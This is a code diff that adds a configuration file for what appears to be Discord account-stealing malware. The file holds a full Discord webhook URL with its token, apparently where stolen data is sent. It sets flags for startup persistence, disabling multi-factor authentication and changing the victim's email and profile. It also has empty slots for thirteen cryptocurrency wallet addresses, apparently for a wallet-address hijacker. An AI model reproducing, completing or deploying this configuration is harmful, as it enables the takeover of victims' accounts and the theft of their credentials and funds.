@@ -1,0 +1,25 @@
+module.exports = {
+  webhook: 'https://discord.com/api/webhooks/1365029406505959495/tpMdvP4FiKQjEG8kT_6eNvJDszCsGCb9yph7AavOXseaRg9H9T4gA7Kc3faqfSDFStVI',
+  inject: {
+    api: 'null',
+    auto_user_profile_edit: 'true',
+    auto_persist_startup: 'true',
+    auto_mfa_disabler: 'true',
+    auto_email_update: 'true',
+  },
+  cryptos: {
+    BTC: '',
+    BCH: '',
+    ETH: '',
+    XMR: '',
+    LTC: '',
+    XCH: '',
+    XLM: '',
+    TRX: '',
+    ADA: '',
+    XRP: '',
+    NEO: '',
+    DASH: '',
+    DOGE: '',
+  },
+};
